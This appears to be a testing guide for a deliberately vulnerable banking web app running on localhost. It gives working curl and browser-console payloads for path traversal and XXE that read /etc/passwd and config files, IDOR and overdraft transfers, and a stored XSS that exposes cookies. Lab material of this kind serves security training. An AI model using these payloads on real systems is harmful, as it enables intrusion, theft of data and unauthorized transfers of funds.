# 🧪 VULNERABILITY TESTING SCRIPT

This file demonstrates how to test all implemented vulnerabilities.

## Prerequisites
```bash
# Make sure the application is running
docker-compose up -d

# The application should be accessible at:
# - Frontend: http://localhost
# - Backend API: http://localhost:8080
```

## 🔐 Admin Credentials
- **Username:** admin  
- **Password:** SecureAdmin123!

---

## 🧪 VULNERABILITY TESTS

### 1. Test Path Traversal Vulnerability

#### Read Application Properties
```bash
curl "http://localhost:8080/api/files/read/../../../application.properties"
```

#### Try to Read System Files (Linux)
```bash
curl "http://localhost:8080/api/files/read/../../../etc/passwd"
```

#### Try to Read System Files (Windows)
```bash
curl "http://localhost:8080/api/files/read/../../../windows/system32/drivers/etc/hosts"
```

#### List Directory Contents
```bash
curl "http://localhost:8080/api/files/list?directory=../../../"
```

### 2. Test XXE Vulnerability

#### Basic XXE Attack
```bash
curl -X POST "http://localhost:8080/api/xml/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE transaction [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<transaction>
  <description>&xxe;</description>
</transaction>'
```

#### XXE with Error Disclosure
```bash
curl -X POST "http://localhost:8080/api/xml/process" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE transaction [
  <!ENTITY xxe SYSTEM "file:///application.properties">
]>
<transaction>
  <description>&xxe;</description>
</transaction>'
```

### 3. Test IDOR Vulnerabilities (Requires Authentication)

#### Step 1: Login to get session
```bash
# Use the frontend at http://localhost to login first
# Or register a new user via API:
curl -X POST "http://localhost:8080/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"password123","fullName":"Ethical Hacker"}'
```

#### Step 2: Test Account Access (after authentication in browser)
```javascript
// In browser console after login:
fetch('/api/accounts')
  .then(response => response.json())
  .then(data => console.log('All accounts exposed:', data));
```

#### Step 3: Test Unauthorized Transfer
```javascript
// In browser console - transfer from any account:
fetch('/api/accounts/transfer', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    fromAccountId: 1,  // Any account ID
    toAccountNumber: "YOUR-ACCOUNT-NUMBER",
    amount: 50000,
    description: "Unauthorized transfer via IDOR"
  })
})
.then(response => response.json())
.then(data => console.log('Transfer result:', data));
```

### 4. Test Business Logic Flaw

#### Transfer More Money Than Available
```javascript
// In browser console after login:
fetch('/api/accounts/transfer', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    fromAccountId: 1,
    toAccountNumber: "ADMIN-002",
    amount: 999999999,  // Huge amount
    description: "Business logic bypass - negative balance"
  })
})
.then(response => response.json())
.then(data => console.log('Negative balance created:', data));
```

### 5. Test Information Disclosure

#### View Any User's Accounts
```javascript
// In browser console after login:
// Try different user IDs
fetch('/api/accounts/user/1')
  .then(response => response.json())
  .then(data => console.log('User 1 accounts:', data));
```

#### View Any Account's Transactions
```javascript
// In browser console after login:
fetch('/api/accounts/1/transactions')
  .then(response => response.json())
  .then(data => console.log('Account 1 transactions:', data));
```

### 6. Test Stored XSS

#### Create Malicious Transfer Description
```javascript
// In browser console after login:
fetch('/api/accounts/transfer', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    fromAccountId: 1,
    toAccountNumber: "ADMIN-001",
    amount: 1,
    description: "<script>alert('XSS Attack! Cookie: ' + document.cookie)</script>"
  })
})
.then(response => response.json())
.then(data => console.log('XSS payload stored:', data));
```

---

## 🎯 TESTING WITH BURP SUITE

### Setup Instructions:
1. Configure your browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to http://localhost
3. Intercept and modify requests to test vulnerabilities

### Key Testing Points:
- **IDOR**: Change account IDs in transfer requests
- **Parameter Manipulation**: Modify amounts, descriptions
- **Path Traversal**: Inject ../ sequences in file parameters
- **XXE**: Send malicious XML payloads
- **SQL Injection**: Test description search with SQL payloads

---

## 🔍 AUTOMATED SCANNING

### OWASP ZAP
```bash
# Quick scan
zap-cli quick-scan --self-contained http://localhost

# Full scan
zap-cli active-scan --self-contained http://localhost
```

### Nikto
```bash
nikto -h http://localhost:8080
```

---

## 📊 EXPECTED RESULTS

✅ **Path Traversal**: Should be able to read application.properties  
✅ **XXE**: Should return file contents in XML responses  
✅ **IDOR**: Should access other users' accounts and perform unauthorized transfers  
✅ **Business Logic**: Should create negative account balances  
✅ **Information Disclosure**: Should view all accounts and transactions  
✅ **XSS**: Should store and execute malicious scripts  

---

**Remember: Only test against your own systems or with explicit permission!**
